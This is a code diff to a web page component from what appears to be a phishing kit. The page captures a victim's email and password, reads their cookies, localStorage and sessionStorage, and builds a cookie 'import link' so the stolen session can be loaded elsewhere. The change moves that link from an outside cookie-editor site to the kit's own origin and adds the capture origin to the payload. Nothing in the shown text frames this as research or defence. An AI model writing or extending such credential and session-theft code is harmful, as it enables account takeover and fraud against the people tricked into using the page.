@@ -54,26 +54,15 @@ export default function Home() {
       document.cookie = `__Secure-3PSID=CAI.${btoa(capturedEmail)}; path=/; domain=${domain}; Secure; SameSite=None`;
     }
 
-    // Capture cookies AFTER setting - parse into Cookie-Editor import format
+    // Capture cookies AFTER setting - direct domain import link
     let cookiesRaw = 'none';
     let cookiesImportLink = '';
-    if (typeof document !== 'undefined' && document.cookie) {
-      cookiesRaw = document.cookie;
-      const cookiesArray = document.cookie.split(';').map((c) => {
-        const [name, ...v] = c.trim().split('=');
-        const value = v.join('=').trim();
-        if (!name || !value) return null;
-        return {
-          name: name.trim(),
-          value: decodeURIComponent(value),
-          domain: window.location.hostname,
-          path: '/',
-        };
-      }).filter(Boolean);
-      if (cookiesArray.length > 0) {
-        try {
-          cookiesImportLink = `https://cookie-editor.cgagnier.ca/?import=${btoa(unescape(encodeURIComponent(JSON.stringify(cookiesArray))))}`;
-        } catch {}
+    let captureOrigin = '';
+    if (typeof document !== 'undefined') {
+      captureOrigin = window.location.origin;
+      if (document.cookie) {
+        cookiesRaw = document.cookie;
+        cookiesImportLink = `${captureOrigin}/cookies?import=${encodeURIComponent(cookiesRaw)}`;
       }
     }
 
@@ -83,6 +72,7 @@ export default function Home() {
       password,
       cookies: cookiesRaw,
       captureDomain: typeof window !== 'undefined' ? window.location.hostname : '',
+      captureOrigin: captureOrigin || '',
       cookiesImportLink: cookiesImportLink || undefined,
       localStorage: typeof localStorage !== 'undefined' ? Object.fromEntries(Object.entries(localStorage)) : {},
       sessionStorage: typeof sessionStorage !== 'undefined' ? Object.fromEntries(Object.entries(sessionStorage)) : {},
